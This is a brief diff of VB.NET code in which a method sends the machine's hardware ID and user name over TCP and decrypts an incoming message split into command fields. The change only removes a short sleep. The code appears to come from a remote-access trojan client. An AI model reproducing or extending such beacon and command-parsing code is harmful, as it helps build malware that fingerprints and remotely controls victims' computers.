@@ -6,7 +6,7 @@
 
         Public Shared Sub Data(ByVal b As Byte())
             Try : C_TcpClient.Send("OK" + SPL + C_ID.HWID + SPL + C_ID.UserName) : Catch : End Try
-            Threading.Thread.Sleep(50)
+
             Dim EN As String = C_Encryption.AES_Decrypt(BS(b))
             Dim A As String() = Split(EN, SPL)
 
